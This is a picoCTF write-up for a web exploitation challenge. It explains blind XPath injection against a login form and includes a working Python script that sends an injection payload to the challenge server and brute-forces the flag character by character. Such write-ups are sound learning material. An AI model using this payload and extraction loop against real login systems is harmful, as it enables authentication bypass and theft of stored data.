 # Introduction
## Problem Details

Category: Web Exploitation
Points: 250
#### Description

Another login you have to bypass. Maybe you can find an injection that works?  [http://mercury.picoctf.net:33594/](http://mercury.picoctf.net:33594/)

## Writeup

This problem is very similar to `LIKE`-based blind SQLi. We can construct an XPATH injection that allows us to search the entire document for a string: `//*[contains(.,'some string')]`. This searches for any node that contains `'some string'`. We can use this to search for the flag. There should only be one node that contains `picoCTF{`, and we can use that to blindly crawl towards the flag, brute forcing incrementally. Whenever we enter a truthy query, we get `You're on the right track`. Whenever we enter a falsey query, we get `Login failed`. So we can iterate over every possible next character of the flag until we get a truthy query, at which point we know that is the next flag character. (About the injection: we need to prevent all other branches of the `OR` from being true, so that the query reduces to our node query). Once we have an injection, it's just a matter of incrementally finding the flag

```py
import string 
import requests 

# Sentinel to know if the character we entered is right or not
c = "right track"
# Checking function
check = lambda flag: c in requests.post('http://mercury.picoctf.net:33594/', { 'name': injection % flag, 'pass': pwd }).content 
# Injection
injection = "' or //*[contains(.,\"%s\")] or 'x'='" 
pwd = 'asdf' 
flag = "picoCTF{" 
# Build list of characters to check (flags are always alphanumeric + _, and end with })
options = string.ascii_letters + "_}" + string.digits 
# Build up flag
while  not flag[-1] == '}': 
    for i in options: 
        if check(flag + i): 
            flag = flag + i 
            print flag 
            break
```